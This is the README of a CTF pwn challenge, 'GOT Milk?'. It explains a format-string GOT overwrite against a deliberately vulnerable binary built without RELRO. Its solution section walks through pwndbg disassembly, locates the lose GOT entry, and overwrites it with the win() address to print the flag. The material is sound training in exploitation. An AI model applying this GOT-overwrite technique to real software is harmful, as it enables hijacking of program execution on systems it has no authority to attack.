# GOT Milk?

> Recommended Category: pwn

CTF Challenge for a format-string based GOT overwrite attack, where the attacker will need to leverage a crafted malicious format string input in order to redirect program execution towards the `win()` function.

## Setup

```
$ make
```

This initializes the challenge binary and dependencies, including the shared object library. The binary
is compiled without RELRO, and not stripped of any binary symbols. It is also linked to the shared object library,
which is built using the header present in `lib/` and should also be copied to a custom `LD_LIBRARY_PATH`.

## The Challenge

This `pwn`-able binary delivers several interesting challenges:

* Disassembling functionality of `lose`, which actually has some interesting un-optimized dead code that helps discover the `win` relocation.
* Figuring out the address of the `win` relocation symbol.
* Crafting malicious format string to pass to call `win` relocation.

## The Solution

In order to redirect execution, we need to keep in mind how the GOT/PLT works, and the
idea behind lazy loading.

When looking at the binary, we can figure out that while `win()` is never called dynamically (therefore it shouldn't have a stub in the `.got.plt` and `.got` sections),
there is dead code that never got eliminated, which makes a call to `win()`.

Let's run the binary once in a disassembler, and see if the function address is loaded after an initial execution:

```
pwndbg> x win
No symbol "win" in current context

pwndbg> r
Starting program: /home/vagrant/ctf_challenges/got-milk/got_milk
Hey you! GOT milk? asdfasdfasdf
Your answer: asdfasdfasdf

No flag for you!
[Inferior 1 (process 8338) exited normally]

pwndbg> x win
0xf7fbb189 <win>:       0x53e58955
```

The address `0xf7fbb189` is where we want to redirect execution to once we reach the vulnerable `printf`. Let's figure out the address of `lose` in the GOT, by first disassembling `main`, and figuring out where our `call` is to `lose` in the PLT stub:

```
pwndbg> disass main
...
   0x080491e0 <+94>:    lea    eax,[ebp-0x6c]
   0x080491e3 <+97>:    push   eax
   0x080491e4 <+98>:    call   0x8049030 <printf@plt>
   0x080491e9 <+103>:   add    esp,0x10
   0x080491ec <+106>:   call   0x8049040 <lose@plt>
   0x080491f1 <+111>:   mov    eax,0x0

pwndbg> disass 0x8049040
Dump of assembler code for function lose@plt:
   0x08049040 <+0>:     jmp    DWORD PTR ds:0x804c010
   0x08049046 <+6>:     push   0x8
   0x0804904b <+11>:    jmp    0x8049020

pwndbg> x 0x804c010
0x804c010 <lose@got.plt>:       0x08049046
```

We want to overwrite the address `0x804c010` with our `win` address. Let's break before and after the vulnerable `printf` function, and attempt to redirect execution:

```
pwndbg> b *0x080491e4
Breakpoint 1 at 0x80491e4: file binary.c, line 23.

pwndbg> b *0x080491e9
Breakpoint 2 at 0x80491e9: file binary.c, line 23.

pwndbg> r
Starting program: /home/vagrant/ctf_challenges/got-milk/got_milk
Hey you! GOT milk? asdfasdf
...

pwndbg> set {int}0x804c010=0xf7fbb189
...

pwndbg> c
Continuing
Breakpoint 2, 0x080491e9 in main (argc=1, argv=0xffffd424) at binary.c:23

pwndbg> c
Continuing.
flag{someflag}
```

